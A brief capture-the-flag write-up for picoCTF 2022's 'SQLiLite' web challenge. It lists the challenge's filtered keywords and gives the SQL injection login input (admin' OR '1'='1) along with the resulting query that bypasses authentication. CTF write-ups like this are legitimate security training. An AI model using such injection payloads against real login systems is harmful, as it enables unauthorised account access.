# SQLiLite

```markdown
Tags: `picoCTF2022` `Web Exploitation` `sql`
```

## **Description**

Can you login to this website?

Additional details will be available after launching your challenge instance.

<figure><img src="../.gitbook/assets/image (31) (1) (1).png" alt=""><figcaption></figcaption></figure>

The filter of this round: or and true false union like = > < ; -- /\* \*/ admin

```sql
Username: admin' OR '1'='1
password: 1
```

```sql
SELECT * FROM users WHERE name='admin' OR '1'='1' AND password='1'
```

## Flag

<figure><img src="../.gitbook/assets/image (32) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
